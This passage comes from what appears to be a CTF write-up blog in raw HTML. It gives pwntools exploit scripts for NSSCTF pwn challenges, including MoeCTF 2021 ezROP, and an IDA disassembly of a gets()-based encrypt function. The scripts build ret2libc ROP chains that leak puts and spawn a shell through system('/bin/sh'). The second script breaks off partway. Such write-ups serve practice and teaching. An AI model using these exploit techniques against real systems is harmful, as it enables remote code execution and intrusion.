class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;DEBUG&#x27;</span>]:</span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    ip = <span class="string">&quot;node5.anna.nssctf.cn&quot;</span></span><br><span class="line">    port = <span class="number">22681</span></span><br><span class="line">    p = remote(ip, port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">    info(<span class="string">&quot;pid: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(p.pid))</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./libc-2.23-x64.so&#x27;)</span></span><br><span class="line"><span class="comment"># clibc = cdll.LoadLibrary(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">rop = ROP(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">ret = rop.find_gadget([<span class="string">&#x27;ret&#x27;</span>])[<span class="number">0</span>]</span><br><span class="line">rdi = rop.find_gadget([<span class="string">&#x27;pop rdi&#x27;</span>,<span class="string">&#x27;ret&#x27;</span>])[<span class="number">0</span>]</span><br><span class="line">info(<span class="string">&quot;ret addr : &#123;:#x&#125;&quot;</span>.<span class="built_in">format</span>(ret))</span><br><span class="line">info(<span class="string">&quot;rdi addr : &#123;:#x&#125;&quot;</span>.<span class="built_in">format</span>(rdi))</span><br><span class="line">offset = <span class="number">0x40</span> + <span class="number">8</span></span><br><span class="line"></span><br><span class="line">payload1 = flat([cyclic(offset),rdi,elf.got[<span class="string">&#x27;puts&#x27;</span>],elf.plt[<span class="string">&#x27;puts&#x27;</span>],<span class="number">0x000000000401187</span>])</span><br><span class="line">sl(payload1)</span><br><span class="line">puts_addr = get_addr()</span><br><span class="line">success(<span class="string">&quot;puts: &#123;:#x&#125;&quot;</span>.<span class="built_in">format</span>(puts_addr))</span><br><span class="line">libc_base = puts_addr - <span class="number">0x80ed0</span></span><br><span class="line">system = <span class="number">0x50d60</span> + libc_base</span><br><span class="line">str_bin_sh = <span class="number">0x1d8698</span> + libc_base</span><br><span class="line">payload2 = flat([cyclic(offset),ret,rdi,str_bin_sh,system])</span><br><span class="line">sl(payload2)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure>

<h3 id="MoeCTF-2021-ezROP"><a href="#MoeCTF-2021-ezROP" class="headerlink" title="[MoeCTF 2021]ezROP"></a>[MoeCTF 2021]ezROP</h3><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>00000000004009A0                 <span class="keyword">push</span>    <span class="built_in">rbp</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004009A1                 <span class="keyword">mov</span>     <span class="built_in">rbp</span>, <span class="built_in">rsp</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004009A4                 <span class="keyword">push</span>    <span class="built_in">rbx</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004009A5                 <span class="keyword">sub</span>     <span class="built_in">rsp</span>, <span class="number">48h</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004009A9 <span class="comment">; 7:   memset(s, 0, sizeof(s));</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004009A9                 <span class="keyword">lea</span>     <span class="built_in">rdx</span>, [<span class="built_in">rbp</span>+s]</span><br><span class="line"><span class="symbol">.text:</span>00000000004009AD                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="number">0</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004009B2                 <span class="keyword">mov</span>     <span class="built_in">ecx</span>, <span class="number">6</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004009B7                 <span class="keyword">mov</span>     <span class="built_in">rdi</span>, <span class="built_in">rdx</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004009BA                 <span class="keyword">rep</span> <span class="keyword">stosq</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004009BD <span class="comment">; 8:   v3 = 0;</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004009BD                 <span class="keyword">mov</span>     <span class="built_in">rdx</span>, <span class="built_in">rdi</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004009C0                 <span class="keyword">mov</span>     [<span class="built_in">rdx</span>], <span class="built_in">ax</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004009C3 <span class="comment">; 9:   puts(&quot;Input your Plaintext to be encrypted&quot;);</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004009C3                 <span class="keyword">add</span>     <span class="built_in">rdx</span>, <span class="number">2</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004009C7                 <span class="keyword">mov</span>     <span class="built_in">edi</span>, offset aInputYourPlain <span class="comment">; &quot;Input your Plaintext to be encrypted&quot;</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004009CC                 <span class="keyword">call</span>    _puts</span><br><span class="line"><span class="symbol">.text:</span>00000000004009D1 <span class="comment">; 10:   gets(s);</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004009D1                 <span class="keyword">lea</span>     <span class="built_in">rax</span>, [<span class="built_in">rbp</span>+s]</span><br><span class="line"><span class="symbol">.text:</span>00000000004009D5                 <span class="keyword">mov</span>     <span class="built_in">rdi</span>, <span class="built_in">rax</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004009D8                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="number">0</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004009<span class="built_in">DD</span>                 <span class="keyword">call</span>    _gets</span><br><span class="line"><span class="symbol">.text:</span>00000000004009E2                 <span class="keyword">jmp</span>     loc_400AB4</span><br><span class="line"><span class="symbol">.text:</span>00000000004009E7 <span class="comment">; ---------------------------------------------------------------------------</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004009E7 <span class="comment">; 16:     if ( s[x] &lt;= 96 || s[x] &gt; 122 )</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004009E7</span><br><span class="line"><span class="symbol">.text:</span>00000000004009E7 loc_4009E7:                             <span class="comment">; CODE XREF: encrypt+12B↓j</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004009E7                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="built_in">cs</span>:x</span><br><span class="line"><span class="symbol">.text:</span>00000000004009ED                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004009EF                 <span class="keyword">movzx</span>   <span class="built_in">eax</span>, [<span class="built_in">rbp</span>+<span class="built_in">rax</span>+s]</span><br><span class="line"><span class="symbol">.text:</span>00000000004009F4                 <span class="keyword">cmp</span>     <span class="built_in">al</span>, <span class="number">60h</span> <span class="comment">; &#x27;`&#x27;</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004009F6                 <span class="keyword">jle</span>     short loc_400A27</span><br><span class="line"><span class="symbol">.text:</span>00000000004009F8                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="built_in">cs</span>:x</span><br><span class="line"><span class="symbol">.text:</span>00000000004009FE                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000400A00                 <span class="keyword">movzx</span>   <span class="built_in">eax</span>, [<span class="built_in">rbp</span>+<span class="built_in">rax</span>+s]</span><br><span class="line"><span class="symbol">.text:</span>0000000000400A05                 <span class="keyword">cmp</span>     <span class="built_in">al</span>, <span class="number">7Ah</span> <span class="comment">; &#x27;z&#x27;</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000400A07                 <span class="keyword">jg</span>      short loc_400A27</span><br><span class="line"><span class="symbol">.text:</span>0000000000400A09 <span class="comment">; 30:       s[x] ^= 0xEu;</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000400A09                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="built_in">cs</span>:x</span><br><span class="line"><span class="symbol">.text:</span>0000000000400A0F                 <span class="keyword">mov</span>     <span class="built_in">edx</span>, <span class="built_in">cs</span>:x</span><br><span class="line"><span class="symbol">.text:</span>0000000000400A15                 <span class="keyword">mov</span>     <span class="built_in">edx</span>, <span class="built_in">edx</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000400A17                 <span class="keyword">movzx</span>   <span class="built_in">edx</span>, [<span class="built_in">rbp</span>+<span class="built_in">rdx</span>+s]</span><br><span class="line"><span class="symbol">.text:</span>0000000000400A1C                 <span class="keyword">xor</span>     <span class="built_in">edx</span>, <span class="number">0Eh</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000400A1F                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000400A21                 <span class="keyword">mov</span>     [<span class="built_in">rbp</span>+<span class="built_in">rax</span>+s], <span class="built_in">dl</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000400A25                 <span class="keyword">jmp</span>     short loc_400AA5</span><br><span class="line"><span class="symbol">.text:</span>0000000000400A27 <span class="comment">; ---------------------------------------------------------------------------</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000400A27 <span class="comment">; 18:       if ( s[x] &lt;= 64 || s[x] &gt; 90 )</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000400A27</span><br><span class="line"><span class="symbol">.text:</span>0000000000400A27 loc_400A27:                             <span class="comment">; CODE XREF: encrypt+56↑j</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000400A27                                         <span class="comment">; encrypt+67↑j</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000400A27                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="built_in">cs</span>:x</span><br><span class="line"><span class="symbol">.text:</span>0000000000400A2D                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000400A2F                 <span class="keyword">movzx</span>   <span class="built_in">eax</span>, [<span class="built_in">rbp</span>+<span class="built_in">rax</span>+s]</span><br><span class="line"><span class="symbol">.text:</span>0000000000400A34                 <span class="keyword">cmp</span>     <span class="built_in">al</span>, <span class="number">40h</span> <span class="comment">; &#x27;@&#x27;</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000400A36                 <span class="keyword">jle</span>     short loc_400A67</span><br><span class="line"><span class="symbol">.text:</span>0000000000400A38                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="built_in">cs</span>:x</span><br><span class="line"><span class="symbol">.text:</span>0000000000400A3E                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000400A40                 <span class="keyword">movzx</span>   <span class="built_in">eax</span>, [<span class="built_in">rbp</span>+<span class="built_in">rax</span>+s]</span><br><span class="line"><span class="symbol">.text:</span>0000000000400A45                 <span class="keyword">cmp</span>     <span class="built_in">al</span>, <span class="number">5Ah</span> <span class="comment">; &#x27;Z&#x27;</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000400A47                 <span class="keyword">jg</span>      short loc_400A67</span><br><span class="line"><span class="symbol">.text:</span>0000000000400A49 <span class="comment">; 25:         s[x] ^= 0xDu;</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000400A49                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="built_in">cs</span>:x</span><br><span class="line"><span class="symbol">.text:</span>0000000000400A4F                 <span class="keyword">mov</span>     <span class="built_in">edx</span>, <span class="built_in">cs</span>:x</span><br><span class="line"><span class="symbol">.text:</span>0000000000400A55                 <span class="keyword">mov</span>     <span class="built_in">edx</span>, <span class="built_in">edx</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000400A57                 <span class="keyword">movzx</span>   <span class="built_in">edx</span>, [<span class="built_in">rbp</span>+<span class="built_in">rdx</span>+s]</span><br><span class="line"><span class="symbol">.text:</span>0000000000400A5C                 <span class="keyword">xor</span>     <span class="built_in">edx</span>, <span class="number">0Dh</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000400A5F                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000400A61                 <span class="keyword">mov</span>     [<span class="built_in">rbp</span>+<span class="built_in">rax</span>+s], <span class="built_in">dl</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000400A65                 <span class="keyword">jmp</span>     short loc_400AA5</span><br><span class="line"><span class="symbol">.text:</span>0000000000400A67 <span class="comment">; ---------------------------------------------------------------------------</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000400A67 <span class="comment">; 20:         if ( s[x] &gt; 47 &amp;&amp; s[x] &lt;= 57 )</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000400A67</span><br><span class="line"><span class="symbol">.text:</span>0000000000400A67 loc_400A67:                             <span class="comment">; CODE XREF: encrypt+96↑j</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000400A67                                         <span class="comment">; encrypt+A7↑j</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000400A67                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="built_in">cs</span>:x</span><br><span class="line"><span class="symbol">.text:</span>0000000000400A6D                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000400A6F                 <span class="keyword">movzx</span>   <span class="built_in">eax</span>, [<span class="built_in">rbp</span>+<span class="built_in">rax</span>+s]</span><br><span class="line"><span class="symbol">.text:</span>0000000000400A74                 <span class="keyword">cmp</span>     <span class="built_in">al</span>, <span class="number">2Fh</span> <span class="comment">; &#x27;/&#x27;</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000400A76                 <span class="keyword">jle</span>     short loc_400AA5</span><br><span class="line"><span class="symbol">.text:</span>0000000000400A78                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="built_in">cs</span>:x</span><br><span class="line"><span class="symbol">.text:</span>0000000000400A7E                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000400A80                 <span class="keyword">movzx</span>   <span class="built_in">eax</span>, [<span class="built_in">rbp</span>+<span class="built_in">rax</span>+s]</span><br><span class="line"><span class="symbol">.text:</span>0000000000400A85                 <span class="keyword">cmp</span>     <span class="built_in">al</span>, <span class="number">39h</span> <span class="comment">; &#x27;9&#x27;</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000400A87                 <span class="keyword">jg</span>      short loc_400AA5</span><br><span class="line"><span class="symbol">.text:</span>0000000000400A89 <span class="comment">; 21:           s[x] ^= 0xCu;</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000400A89                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="built_in">cs</span>:x</span><br><span class="line"><span class="symbol">.text:</span>0000000000400A8F                 <span class="keyword">mov</span>     <span class="built_in">edx</span>, <span class="built_in">cs</span>:x</span><br><span class="line"><span class="symbol">.text:</span>0000000000400A95                 <span class="keyword">mov</span>     <span class="built_in">edx</span>, <span class="built_in">edx</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000400A97                 <span class="keyword">movzx</span>   <span class="built_in">edx</span>, [<span class="built_in">rbp</span>+<span class="built_in">rdx</span>+s]</span><br><span class="line"><span class="symbol">.text:</span>0000000000400A9C                 <span class="keyword">xor</span>     <span class="built_in">edx</span>, <span class="number">0Ch</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000400A9F                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000400AA1                 <span class="keyword">mov</span>     [<span class="built_in">rbp</span>+<span class="built_in">rax</span>+s], <span class="built_in">dl</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000400AA5 <span class="comment">; 32:     ++x;</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000400AA5</span><br><span class="line"><span class="symbol">.text:</span>0000000000400AA5 loc_400AA5:                             <span class="comment">; CODE XREF: encrypt+85↑j</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000400AA5                                         <span class="comment">; encrypt+C5↑j ...</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000400AA5                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="built_in">cs</span>:x</span><br><span class="line"><span class="symbol">.text:</span>0000000000400AAB                 <span class="keyword">add</span>     <span class="built_in">eax</span>, <span class="number">1</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000400AAE                 <span class="keyword">mov</span>     <span class="built_in">cs</span>:x, <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000400AB4 <span class="comment">; 13:     v0 = (unsigned int)x;</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000400AB4</span><br><span class="line"><span class="symbol">.text:</span>0000000000400AB4 loc_400AB4:                             <span class="comment">; CODE XREF: encrypt+42↑j</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000400AB4                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="built_in">cs</span>:x</span><br><span class="line"><span class="symbol">.text:</span>0000000000400ABA <span class="comment">; 11:   while ( 1 )</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000400ABA                 <span class="keyword">mov</span>     <span class="built_in">ebx</span>, <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000400ABC <span class="comment">; 14:     if ( v0 &gt;= strlen(s) )</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000400ABC                 <span class="keyword">lea</span>     <span class="built_in">rax</span>, [<span class="built_in">rbp</span>+s]</span><br><span class="line"><span class="symbol">.text:</span>0000000000400AC0                 <span class="keyword">mov</span>     <span class="built_in">rdi</span>, <span class="built_in">rax</span>        <span class="comment">; s</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000400AC3                 <span class="keyword">call</span>    _strlen</span><br><span class="line"><span class="symbol">.text:</span>0000000000400AC8 <span class="comment">; 15:       break;</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000400AC8                 <span class="keyword">cmp</span>     <span class="built_in">rbx</span>, <span class="built_in">rax</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000400ACB                 <span class="keyword">jb</span>      loc_4009E7</span><br><span class="line"><span class="symbol">.text:</span>0000000000400AD1 <span class="comment">; 34:   puts(&quot;Ciphertext&quot;);</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000400AD1                 <span class="keyword">mov</span>     <span class="built_in">edi</span>, offset aCiphertext <span class="comment">; &quot;Ciphertext&quot;</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000400AD6                 <span class="keyword">call</span>    _puts</span><br><span class="line"><span class="symbol">.text:</span>0000000000400ADB <span class="comment">; 35:   return puts(s);</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000400ADB                 <span class="keyword">lea</span>     <span class="built_in">rax</span>, [<span class="built_in">rbp</span>+s]</span><br><span class="line"><span class="symbol">.text:</span>0000000000400ADF                 <span class="keyword">mov</span>     <span class="built_in">rdi</span>, <span class="built_in">rax</span>        <span class="comment">; s</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000400AE2                 <span class="keyword">call</span>    _puts</span><br><span class="line"><span class="symbol">.text:</span>0000000000400AE7                 <span class="keyword">nop</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000400AE8                 <span class="keyword">add</span>     <span class="built_in">rsp</span>, <span class="number">48h</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000400AEC                 <span class="keyword">pop</span>     <span class="built_in">rbx</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000400AED                 <span class="keyword">pop</span>     <span class="built_in">rbp</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000400AEE                 <span class="keyword">retn</span></span><br></pre></td></tr></table></figure>

<p>libc6_2.23-0ubuntu11.3_amd64</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">a</span>) : p.send(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a, b</span>) : p.sendafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">a</span>) : p.sendline(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a, b</span>) : p.sendlineafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>() : <span class="keyword">return</span> p.recv()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pr</span>() : <span class="built_in">print</span>(p.recv())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(<span class="params">a</span>) : <span class="keyword">return</span> p.recvuntil(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>() : p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>() : <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment"># def get_sb() : return libc_base + libc.sym[&#x27;system&#x27;], libc_base + next(libc.search(b&#x27;/bin/sh\x00&#x27;))</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">rdi, rsi, rdx, rip, gadget</span>) : <span class="keyword">return</span> p64(gadget) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(rip) + p64(rdi) + p64(rsi) + p64(rdx) + p64(gadget - <span class="number">0x1a</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_32_addr</span>():	<span class="keyword">return</span> u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;DEBUG&#x27;</span>]:</span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    ip = <span class="string">&quot;node5.anna.nssctf.cn&quot;</span></span><br><span class="line">    port = <span class="number">22814</span></span><br><span class="line">    p = remote(ip, port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">    info(<span class="string">&quot;pid: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(p.pid))</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./libc-2.23-x64.so&#x27;)</span></span><br><span class="line"><span class="comment"># clibc = cdll.LoadLibrary(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">rop = ROP(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">ret = rop.find_gadget([<span class="string">&#x27;ret&#x27;</span>])[<span class="number">0</span>]</span><br><span class="line">rdi = rop.find_gadget([<span class="string">&#x27;pop rdi&#x27;</span>,<span class="string">&#x27;ret&#x27;</span>])[<span class="number">0</span>]</span><br><span class="line">info(<span class="string">&quot;ret addr : &#123;:#x&#125;&quot;</span>.<span class="built_in">format</span>(ret))</span><br><span class="line">info(<span class="string">&quot;rdi addr : &#123;:#x&#125;&quot;</span>.<span class="built_in">format</span>(rdi))</span><br><span class="line">sl(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">offset = <span class="number">0x50</span> + <span class="number">8</span></span><br><span class="line"></span><br><span class="line">payload1 = flat([cyclic(offset),rdi,elf.got[<span class="string">&#x27;puts&#x27;</span>],elf.plt[<span class="string">&#x27;puts&#x27;</span>],<span class="number">0x4009A0</span>])</span><br><span class="line">sl(payload1)</span><br><span class="line">rl(<span class="string">&#x27;Ciphertext\n&#x27;</span>)</span><br><span class="line">rl(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">puts = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&quot;put: &#123;:#x&#125;&quot;</span>.<span class="built_in">format</span>(puts))</span><br><span class="line"></span><br><span class="line">payload1 = 